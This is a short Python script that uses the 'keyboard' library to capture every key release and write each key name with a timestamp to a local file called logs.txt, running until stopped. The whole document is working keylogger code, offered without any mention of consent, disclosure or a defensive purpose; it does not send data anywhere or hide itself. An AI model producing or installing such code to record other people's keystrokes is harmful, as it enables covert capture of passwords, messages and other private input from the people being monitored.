import keyboard
import logging

# Set up logging
log_file = "logs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to log key events
def log_key_event(event):
    logging.info(event.name)

# Add a listener for key events
keyboard.on_release(callback=log_key_event)

# Keep the program running
keyboard.wait()
